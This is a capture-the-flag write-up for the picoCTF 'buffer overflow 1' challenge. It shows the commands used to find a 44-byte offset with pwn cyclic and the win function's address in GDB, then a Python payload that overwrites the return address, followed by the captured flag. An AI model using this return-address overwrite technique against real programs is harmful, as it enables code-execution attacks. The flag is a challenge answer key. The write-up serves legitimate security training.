# buffer overflow 1
Binary Exploitation - 200 points

## Challenge 
> Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this [program](vuln)? You can find it in /problems/buffer-overflow-1_0_787812af44ed1f8151c893455eb1a613 on the shell server. 

[Source](vuln.c).

## Solution

Return address is shown 

	$ ./vuln 
	Please enter your string: 
	Okay, time to return... Fingers Crossed... Jumping to 0x80486b3

Get offset value

	$ pwn cyclic 100 | ./vuln
	Please enter your string: 
	Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
	Segmentation fault

	$ pwn cyclic -l 0x6161616c
	44

Get address from GDB
	
	$ gdb vuln
	(gdb) info add win
	Symbol "win" is at 0x80485cb in a file compiled without debugging.

Craft payload

	$ python -c 'print "\x00"*44 + "\xcb\x85\x04\x08"' | ./vuln 
	Please enter your string: 
	Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
	picoCTF{addr3ss3s_ar3_3asy3656a9b3}Segmentation fault


## Flag

	picoCTF{addr3ss3s_ar3_3asy3656a9b3}
